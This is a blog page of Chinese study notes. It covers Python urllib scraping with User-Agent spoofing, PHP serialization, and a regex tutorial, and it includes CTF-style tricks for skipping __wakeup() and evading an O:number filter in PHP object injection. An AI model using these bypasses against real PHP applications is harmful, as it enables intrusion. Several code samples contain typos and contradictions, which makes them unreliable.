<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line">response &#x3D; urllib.request.urlopen(&quot;http:&#x2F;&#x2F;www.baidu.com&quot;)</span><br><span class="line">print(response。read()。decode(&quot;utf-8&quot;))</span><br></pre></td></tr></table></figure>

<p>得到</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201017161013144.png"></p>
<p>重复上面的做法的到</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201017161042340.png"></p>
<p>获取一个post请求</p>
<p>首先打开测试网页httpbin.org</p>
<p>用post请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line">import urllib.pase #解析器</span><br><span class="line">data &#x3D;bytes(urllib.parse.urlencode(&#123;&quot;hello&quot;:&quot;world&quot;&#125;),encoding&#x3D;&quot;utf-8&quot;) #二进制数据包</span><br><span class="line">response&#x3D;urllib.request.urlopen(&quot;http:&#x2F;&#x2F;httpbin.org&#x2F;post&quot;,data&#x3D;data)</span><br><span class="line">print(response.read().decode(&quot;utf-8&quot;))</span><br></pre></td></tr></table></figure>

<p>得到</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201017161643463.png"></p>
<p>与测试网页post相应的返回值格式基本相似</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201017161704503.png"></p>
<p>当使用get请求时</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">response &#x3D;urllib.request.urlopen(&quot;http:&#x2F;&#x2F;httpbin.org&#x2F;get&quot;)</span><br><span class="line">print(response.read().decode(&quot;utf-8&quot;))</span><br></pre></td></tr></table></figure>

<p>得到相应的结果</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201017162022204.png"></p>
<p>3.超时处理</p>
<p>当对于一个网页的访问时长有一个时间限定时</p>
<p>例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">response &#x3D;urllib.request.urlopen(&quot;http:&#x2F;&#x2F;httpbin.org&#x2F;get&quot;,timeout&#x3D;0.01)</span><br><span class="line">print(response.read().decode(&quot;utf-8&quot;))</span><br></pre></td></tr></table></figure>

<p>结果会报错</p>
<p>可以运用</p>
<p>try:</p>
<p>except</p>
<p>对执行的命令进行检测</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201017162729575.png"></p>
<p>运行将返回一个</p>
<p>time out</p>
<p>4.其他爬取操作</p>
<p>/1例如我们想知道网页的状态码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">response &#x3D;urllib.request.urlopen(&quot;http:&#x2F;&#x2F;httpbin.org&quot;)</span><br><span class="line">print(response.status)</span><br></pre></td></tr></table></figure>

<p>输出为</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201017163033353.png"></p>
<p>/2获取网页的headers</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">response &#x3D;urllib.request.urlopen(&quot;http:&#x2F;&#x2F;www.baidu.com&quot;)</span><br><span class="line">print(response.getheaders())</span><br></pre></td></tr></table></figure>

<p>输出</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201017163353698.png"></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201017163433382.png"></p>
<p>Getheaders(“”)””里面可填写headers里面的信息进去查询获取</p>
<p>/3伪装浏览器</p>
<p>因为网页的开发和设定，有些网页不允许爬</p>
<p>因此需要我们伪装浏览器</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201017163823454.png"></p>
<p>输出</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201017163846195.png"></p>
<p>发现我们的user-Agent为浏览器即伪装成功</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://ggken753.github.io/2020/10/18/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/" data-id="ckgdfpb2o00005cv38ubbe9k1" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-学习笔记" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/10/08/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="article-date">
  <time datetime="2020-10-08T03:13:01.555Z" itemprop="datePublished">2020-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/08/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记一</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.     </p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><p> 所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。<br>为了能够unserialize()一个对象，这个对象的类必须已经定义过。如果序列化类A的一个对象，将会返回一个跟类A相关，而且包含了对象所有变量值的字符串。 如果要想在另外一个文件中解序列化一个对象，这个对象的类必须在解序列化之前定义，可以通过包含一个定义该类的文件或使用函数spl_autoload_register()来实现。<br>类型    过程<br>序列化    对象—&gt; 字符串<br>反序列化    字符串—&gt;对象<br>一．序列化</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class student&#123;</span><br><span class="line">    public <span class="variable">$name</span>;</span><br><span class="line">     public <span class="variable">$age</span>;</span><br><span class="line">     public <span class="variable">$number</span>;</span><br><span class="line"></span><br><span class="line">     //_construct：创建对象时初始化</span><br><span class="line">     <span class="keyword">function</span> __construct(<span class="variable">$name</span>,<span class="variable">$age</span>,<span class="variable">$number</span>)&#123;        </span><br><span class="line">          <span class="variable">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">          <span class="variable">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">          <span class="variable">$this</span>-&gt;number = <span class="variable">$number</span>;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$student</span> = new student(<span class="string">&quot;Jack&quot;</span>,22,11086);</span><br><span class="line">var_dump(serialize(<span class="variable">$student</span>));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">```    </span><br><span class="line">运行结果：</span><br><span class="line">```bash</span><br><span class="line">string(76) <span class="string">&quot;O:7:&quot;</span>student<span class="string">&quot;:3:&#123;s:4:&quot;</span>name<span class="string">&quot;;s:4:&quot;</span>Jack<span class="string">&quot;;s:3:&quot;</span>age<span class="string">&quot;;i:22;s:6:&quot;</span>number<span class="string">&quot;;i:11086;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
<p>$student =’O:7:”student”:3:{s:4:”name”;s:4:”Jack”;s:3:”age”;i:22;s:6:”number”;i:11086;}’;中<br>O：表示对象；<br>7:表示类的名称的长度；<br>3:表示类中的成员属性有三个变量；<br>s:4、s:3、s:3、s:6 ：s表示字符串，后面的数字表示字符串的长度；<br>i:22、i:11086: i表示整形 后面数字表示整形的长度；</p>
<p>二．反序列化</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class student&#123;</span><br><span class="line">    public <span class="variable">$name</span>;</span><br><span class="line">     public <span class="variable">$age</span>;</span><br><span class="line">     public <span class="variable">$number</span>;</span><br><span class="line"></span><br><span class="line">     //_construct：创建对象时初始化</span><br><span class="line">     <span class="keyword">function</span> __construct(<span class="variable">$name</span>,<span class="variable">$age</span>,<span class="variable">$number</span>)&#123;        </span><br><span class="line">          <span class="variable">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">          <span class="variable">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">          <span class="variable">$this</span>-&gt;number = <span class="variable">$number</span>;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$student</span> = <span class="string">&#x27;O:7:&quot;student&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;Jack&quot;;s:3:&quot;age&quot;;i:22;s:6:&quot;number&quot;;i:11086;&#125;&#x27;</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$student</span>));</span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">object(student)<span class="comment">#1 (3) &#123;</span></span><br><span class="line">  [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">  string(4) <span class="string">&quot;Jack&quot;</span></span><br><span class="line">  [<span class="string">&quot;age&quot;</span>]=&gt;</span><br><span class="line">  int(22)</span><br><span class="line">  [<span class="string">&quot;number&quot;</span>]=&gt;</span><br><span class="line">  int(11086)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数    说明<br>__construct()    类的构造函数<br>__destruct()    类的析构函数<br>__call()    在对象中调用一个不可访问方法时调用<br>__callStatic()    用静态方式中调用一个不可访问方法时调用<br>__get()    获得一个类的成员变量时调用<br>__set()    设置一个类的成员变量时调用<br>__isset()    当对不可访问属性调用isset()或empty()时调用<br>__unset()    当对不可访问属性调用unset()时被调用<br>__sleep()    执行serialize()时，先会调用这个函数<br>__wakeup()    执行unserialize()时，先会调用这个函数<br>__toString()    类被当成字符串时的回应方法<br>__invoke()    调用函数的方式调用一个对象时的回应方法<br>__set_state()    调用var_export()导出类时，此静态方法会被调用<br>__clone    当对象复制完成时调用<br>__autoload()    尝试加载未定义的类<br>__debugInfo()    打印所需调试信息</p>
<p>三．__wakeup()<br>将在序列化之后立即被调用<br>当序列化字符串表示对象属性个数的数字值大于真实类中属性的个数时就会跳过__wakeup的执行。<br>与 序列化函数类似?unserialize()?会检查是否存在一个?__wakeup()魔术方法<br>如果存在则会先调用__wakeup()方法在进行反序列化<br>可以再__wakeup()方法中对属性进行初始化或者改变。<br>例题</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class xctf&#123;</span><br><span class="line">public <span class="variable">$flag</span> =<span class="string">&#x27;111&#x27;</span>;</span><br><span class="line">public <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;&#125;</span><br><span class="line"><span class="built_in">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure>
<p>对这个进行序列化</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class xctf&#123;</span><br><span class="line">public <span class="variable">$flag</span> =<span class="string">&#x27;111&#x27;</span>;</span><br><span class="line">public <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;&#125;</span><br><span class="line"><span class="built_in">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> =new xctf;</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>运行结果得到</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:<span class="string">&quot;xctf&quot;</span>:2:&#123;s:4:<span class="string">&quot;flag&quot;</span>;s:3:<span class="string">&quot;111&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>然后将序列化后字符串中属性的个数由1改为2，大于真实属性个数1，即可绕过__wakeup</p>
<p>四．O/C绕过<br>正则匹配的意思是如果在var变量中存在O/C:数字（O:数字或者C：数字这样的形式）就die掉，这里匹配的是0:4，直接使用+号当作空格即可绕过，即0:+4即可绕过<br>正则匹配：<br>正则表达式从左到右进行计算，并遵循优先级顺序，这与算术表达式非常类似。<br>相同优先级的从左到右进行运算，不同优先级的运算先高后低。下表从最高到最低说明了各种正则表达式运算符的优先级顺序：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">运算符 	描述</span><br><span class="line">\ 	转义符</span><br><span class="line">(), (?:), (?=), [] 	圆括号和方括号</span><br><span class="line">*, +, ?, &#123;n&#125;, &#123;n,&#125;, &#123;n,m&#125; 	限定符</span><br><span class="line">^, $, \任何元字符、任何字符 	定位点和序列（即：位置和顺序）</span><br><span class="line">| 	替换，<span class="string">&quot;或&quot;</span>操作</span><br><span class="line">字符具有高于替换运算符的优先级，使得<span class="string">&quot;m|food&quot;</span>匹配<span class="string">&quot;m&quot;</span>或<span class="string">&quot;food&quot;</span>。若要匹配<span class="string">&quot;mood&quot;</span>或<span class="string">&quot;food&quot;</span>，请使用括号创建子表达式，从而产生<span class="string">&quot;(m|f)ood&quot;</span>。 </span><br></pre></td></tr></table></figure>
<p>正则表达式 - 匹配规则<br>基本模式匹配<br>一切从最基本的开始。模式，是正则表达式最基本的元素，它们是一组描述字符串特征的字符。模式可以很简单，由普通的字符串组成，也可以非常复杂，往往用特殊的字符表示一个范围内的字符、重复出现，或表示上下文。例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^once</span><br></pre></td></tr></table></figure>
<p>这个模式包含一个特殊的字符^，表示该模式只匹配那些以once开头的字符串。例如该模式与字符串”once upon a time”匹配，与”There once was a man from NewYork”不匹配。正如如^符号表示开头一样，$符号用来匹配那些以给定模式结尾的字符串。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bucket$</span><br></pre></td></tr></table></figure>
<p>这个模式与”Who kept all of this cash in a bucket”匹配，与”buckets”不匹配。字符 ^ 和 $ 同时使用时，表示精确匹配（字符串与模式一样）。例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^bucket$</span><br></pre></td></tr></table></figure>
<p>只匹配字符串”bucket”。如果一个模式不包括^和$，那么它与任何包含该模式的字符串匹配。例如：模式</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">once</span><br></pre></td></tr></table></figure>
<p>与字符串<br>There once was a man from NewYorkWho kept all of his cash in a bucket.<br>是匹配的。<br>在该模式中的字母(o-n-c-e)是字面的字符，也就是说，他们表示该字母本身，数字也是一样的。其他一些稍微复杂的字符，如标点符号和白字符（空格、制表符等），要用到转义序列。所有的转义序列都用反斜杠()打头。制表符的转义序列是 \t。所以如果我们要检测一个字符串是否以制表符开头，可以用这个模式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^\t </span><br></pre></td></tr></table></figure>
<p>类似的，用\n表示”新行”，\r表示回车。其他的特殊符号，可以用在前面加上反斜杠，如反斜杠本身用\表示，句号.用.表示，以此类推。<br>字符簇<br>在INTERNET的程序中，正则表达式通常用来验证用户的输入。当用户提交一个FORM以后，要判断输入的电话号码、地址、EMAIL地址、信用卡号码等是否有效，用普通的基于字面的字符是不够的。<br>所以要用一种更自由的描述我们要的模式的办法，它就是字符簇。要建立一个表示所有元音字符的字符簇，就把所有的元音字符放在一个方括号里：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[AaEeIiOoUu]</span><br></pre></td></tr></table></figure>
<p>这个模式与任何元音字符匹配，但只能表示一个字符。用连字号可以表示一个字符的范围，如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[a-z] //匹配所有的小写字母 [A-Z] //匹配所有的大写字母 [a-zA-Z] //匹配所有的字母 [0-9] //匹配所有的数字 [0-9\.\-] //匹配所有的数字，句号和减号 [ \f\r\t\n] //匹配所有的白字符</span><br></pre></td></tr></table></figure>
<p>同样的，这些也只表示一个字符，这是一个非常重要的。如果要匹配一个由一个小写字母和一位数字组成的字符串，比如”z2”、”t6”或”g7”，但不是”ab2”、”r2d3” 或”b52”的话，用这个模式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[a-z][0-9]$</span><br></pre></td></tr></table></figure>
<p>尽管[a-z]代表26个字母的范围，但在这里它只能与第一个字符是小写字母的字符串匹配。<br>前面曾经提到^表示字符串的开头，但它还有另外一个含义。当在一组方括号里使用 ^ 时，它表示”非”或”排除”的意思，常常用来剔除某个字符。还用前面的例子，我们要求第一个字符不能是数字：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[^0-9][0-9]$</span><br></pre></td></tr></table></figure>
<p>这个模式与”&amp;5”、”g7”及”-2”是匹配的，但与”12”、”66”是不匹配的。下面是几个排除特定字符的例子：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[^a-z] //除了小写字母以外的所有字符 [^\\\/\^] //除了(\)(/)(^)之外的所有字符 [^\&quot;\<span class="string">&#x27;] //除了双引号(&quot;)和单引号(&#x27;</span>)之外的所有字符</span><br></pre></td></tr></table></figure>
<p>特殊字符 .(点，句号)在正则表达式中用来表示除了”新行”之外的所有字符。所以模式 ^.5$ 与任何两个字符的、以数字5结尾和以其他非”新行”字符开头的字符串匹配。模式 . 可以匹配任何字符串，除了空串和只包括一个”新行”的字符串<br>PHP的正则表达式有一些内置的通用字符簇，列表如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">字符簇 	描述</span><br><span class="line">[[:alpha:]] 	任何字母</span><br><span class="line">[[:digit:]] 	任何数字</span><br><span class="line">[[:alnum:]] 	任何字母和数字</span><br><span class="line">[[:space:]] 	任何空白字符</span><br><span class="line">[[:upper:]] 	任何大写字母</span><br><span class="line">[[:lower:]] 	任何小写字母</span><br><span class="line">[[:punct:]] 	任何标点符号</span><br><span class="line">[[:xdigit:]] 	任何16进制的数字，相当于[0-9a-fA-F]</span><br></pre></td></tr></table></figure>
<p>确定重复出现<br>到现在为止，你已经知道如何去匹配一个字母或数字，但更多的情况下，可能要匹配一个单词或一组数字。一个单词有若干个字母组成，一组数字有若干个单数组成。跟在字符或字符簇后面的花括号({})用来确定前面的内容的重复出现的次数。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">字符簇 	描述</span><br><span class="line">^[a-zA-Z_]$ 	所有的字母和下划线</span><br><span class="line">^[[:alpha:]]&#123;3&#125;$ 	所有的3个字母的单词</span><br><span class="line">^a$ 	字母a</span><br><span class="line">^a&#123;4&#125;$ 	aaaa</span><br><span class="line">^a&#123;2,4&#125;$ 	aa,aaa或aaaa</span><br><span class="line">^a&#123;1,3&#125;$ 	a,aa或aaa</span><br><span class="line">^a&#123;2,&#125;$ 	包含多于两个a的字符串</span><br><span class="line">^a&#123;2,&#125; 	如：aardvark和aaab，但apple不行</span><br><span class="line">a&#123;2,&#125; 	如：baad和aaa，但Nantucket不行</span><br><span class="line">\t&#123;2&#125; 	两个制表符</span><br><span class="line">.&#123;2&#125; 	所有的两个字符</span><br></pre></td></tr></table></figure>
<p>这些例子描述了花括号的三种不同的用法。一个数字 {x} 的意思是前面的字符或字符簇只出现x次 ；一个数字加逗号 {x,} 的意思是前面的内容出现x或更多的次数 ；两个数字用逗号分隔的数字 {x,y} 表示 前面的内容至少出现x次，但不超过y次。我们可以把模式扩展到更多的单词或数字：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">^[a-zA-Z0-9_]&#123;1,&#125;$      // 所有包含一个以上的字母、数字或下划线的字符串 </span><br><span class="line">^[1-9][0-9]&#123;0,&#125;$        // 所有的正整数 </span><br><span class="line">^\-&#123;0,1&#125;[0-9]&#123;1,&#125;$      // 所有的整数 </span><br><span class="line">^[-]?[0-9]+\.?[0-9]+$   // 所有的浮点数</span><br></pre></td></tr></table></figure>
<p>以一个可选的负号 ([-]?) 开头 (^)、跟着1个或更多的数字([0-9]+)、和一个小数点(.)再跟上1个或多个数字([0-9]+)，并且后面没有其他任何东西($)。下面你将知道能够使用的更为简单的方法。<br>特殊字符 ? 与 {0,1} 是相等的，它们都代表着： 0个或1个前面的内容 或 前面的内容是可选的 。所以刚才的例子可以简化为：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^\-?[0-9]&#123;1,&#125;\.?[0-9]&#123;1,&#125;$</span><br></pre></td></tr></table></figure>
<p>特殊字符 * 与 {0,} 是相等的，它们都代表着 0 个或多个前面的内容 。最后，字符 + 与 {1,} 是相等的，表示 1 个或多个前面的内容 ，所以上面的4个例子可以写成：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[a-zA-Z0-9_]+$      // 所有包含一个以上的字母、数字或下划线的字符串 ^[1-9][0-9]*$        // 所有的正整数 ^\-?[0-9]+$          // 所有的整数 ^[-]?[0-9]+(\.[0-9]+)?$ // 所有的浮点数</span><br></pre></td></tr></table></figure>
<p>正则表达式 - 示例<br>简单表达式<br>正则表达式的最简单形式是在搜索字符串中匹配其本身的单个普通字符。例如，单字符模式，如 A，不论出现在搜索字符串中的何处，它总是匹配字母 A。下面是一些单字符正则表达式模式的示例：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/a//7//M/</span><br></pre></td></tr></table></figure>
<p>可以将许多单字符组合起来以形成大的表达式。例如，以下正则表达式组合了单字符表达式：a、7 和 M。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/a7M/</span><br></pre></td></tr></table></figure>
<p>请注意，没有串联运算符。只须在一个字符后面键入另一个字符。<br>字符匹配<br>句点 (.) 匹配字符串中的各种打印或非打印字符，只有一个字符例外。这个例外就是换行符 (\n)。下面的正则表达式匹配 aac、abc、acc、adc 等等，以及 a1c、a2c、a-c 和 a#c：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/a.c/</span><br></pre></td></tr></table></figure>
<p>若要匹配包含文件名的字符串，而句点 (.) 是输入字符串的组成部分，请在正则表达式中的句点前面加反斜杠 () 字符。举例来说明，下面的正则表达式匹配 filename.ext：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/filename\.ext/</span><br></pre></td></tr></table></figure>
<p>这些表达式只让您匹配”任何”单个字符。可能需要匹配列表中的特定字符组。例如，可能需要查找用数字表示的章节标题（Chapter 1、Chapter 2 等等）。<br>中括号表达式<br>若要创建匹配字符组的一个列表，请在方括号（[ 和 ]）内放置一个或更多单个字符。当字符括在中括号内时，该列表称为”中括号表达式”。与在任何别的位置一样，普通字符在中括号内表示其本身，即，它在输入文本中匹配一次其本身。大多数特殊字符在中括号表达式内出现时失去它们的意义。不过也有一些例外，如：<br>?如果 ] 字符不是第一项，它结束一个列表。若要匹配列表中的 ] 字符，请将它放在第一位，紧跟在开始 [ 后面。<br>?\ 字符继续作为转义符。若要匹配 \ 字符，请使用 \。<br>括在中括号表达式中的字符只匹配处于正则表达式中该位置的单个字符。以下正则表达式匹配 Chapter 1、Chapter 2、Chapter 3、Chapter 4 和 Chapter 5：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Chapter [12345]/</span><br></pre></td></tr></table></figure>
<p>请注意，单词 Chapter 和后面的空格的位置相对于中括号内的字符是固定的。中括号表达式指定的只是匹配紧跟在单词 Chapter 和空格后面的单个字符位置的字符集。这是第九个字符位置。<br>若要使用范围代替字符本身来表示匹配字符组，请使用连字符 (-) 将范围中的开始字符和结束字符分开。单个字符的字符值确定范围内的相对顺序。下面的正则表达式包含范围表达式，该范围表达式等效于上面显示的中括号中的列表。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Chapter [1-5]/</span><br></pre></td></tr></table></figure>
<p>当以这种方式指定范围时，开始值和结束值两者都包括在范围内。注意，还有一点很重要，按 Unicode 排序顺序，开始值必须在结束值的前面。<br>若要在中括号表达式中包括连字符，请采用下列方法之一：<br>  用反斜杠将它转义： </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[\-]</span><br></pre></td></tr></table></figure>
<p> 将连字符放在中括号列表的开始或结尾。下面的表达式匹配所有小写字母和连字符： </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[-a-z][a-z-]</span><br><span class="line">```    创建一个范围，在该范围中，开始字符值小于连字符，而结束字符值等于或大于连字符。下面的两个正则表达式都满足这一要求： </span><br><span class="line">```bash</span><br><span class="line">[!--][!-~]</span><br></pre></td></tr></table></figure>
<p>若要查找不在列表或范围内的所有字符，请将插入符号 (^) 放在列表的开头。如果插入字符出现在列表中的其他任何位置，则它匹配其本身。下面的正则表达式匹配1、2、3、4 或 5 之外的任何数字和字符：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Chapter [^12345]/</span><br></pre></td></tr></table></figure>
<p>在上面的示例中，表达式在第九个位置匹配 1、2、3、4 或 5 之外的任何数字和字符。这样，例如，Chapter 7 就是一个匹配项，Chapter 9 也是一个匹配项。<br>上面的表达式可以使用连字符 (-) 来表示：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Chapter [^1-5]/</span><br></pre></td></tr></table></figure>
<p>中括号表达式的典型用途是指定任何大写或小写字母或任何数字的匹配。下面的表达式指定这样的匹配：</p>
